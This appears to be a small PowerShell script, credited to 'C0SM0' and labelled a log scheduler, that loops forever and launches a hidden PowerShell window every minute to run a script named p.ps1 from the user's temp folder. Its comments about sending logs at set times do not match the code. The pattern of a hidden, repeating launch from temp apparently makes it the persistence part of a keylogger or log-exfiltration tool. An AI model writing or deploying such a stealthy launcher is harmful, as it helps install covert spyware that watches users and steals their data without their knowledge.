# powershell log scheduler
# created by : C0SM0

# times logs will be sent [keep in military time]
for(;;) {
    try {
     # invoke the worker script
     powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
    }
    catch {
     # do something with $_, log it, more likely
    }
   
    # wait for a minute
    Start-Sleep 60
   }

# sort the times in chronological order
